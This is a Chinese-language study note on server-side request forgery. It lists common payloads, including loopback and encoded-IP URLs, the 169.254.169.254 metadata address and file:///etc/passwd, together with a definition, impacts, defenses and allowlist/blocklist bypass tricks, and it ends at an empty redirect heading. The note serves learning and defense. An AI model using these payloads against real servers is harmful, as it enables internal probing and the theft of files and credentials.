## 常用payload
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22

http://localhost:80
http://localhost:443
http://localhost:22

https://127.0.0.1/
https://localhost/

http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid

http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254

http://0177.0.0.1/

http://expected-host@www.baidu.com

file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd

```
[参考链接](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
## 漏洞基础
	Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.
## 漏洞危害
	利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等
## 漏洞防御
1. 设置URL白名单或者限制内网IP
2. 限制请求的端口为http常用的端口，比如 80、443、8080、8090
3. 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题
4. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态
5. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准
6. **个人意见：有些能放服务端的东西，就别由客户端控制参数。**
## 漏洞绕过
### 黑名单
-   Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
-   Registering your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
-   Obfuscating blocked strings using URL encoding or case variation.
### 白名单
-   You can embed credentials in a URL before the hostname, using the `@` character. For example:
    `https://expected-host@evil-host`
-   You can use the `#` character to indicate a URL fragment. For example:
    `https://evil-host#expected-host`
-   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    `https://expected-host.evil-host`
-   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
-   You can use combinations of these techniques together.

### 利用重定向
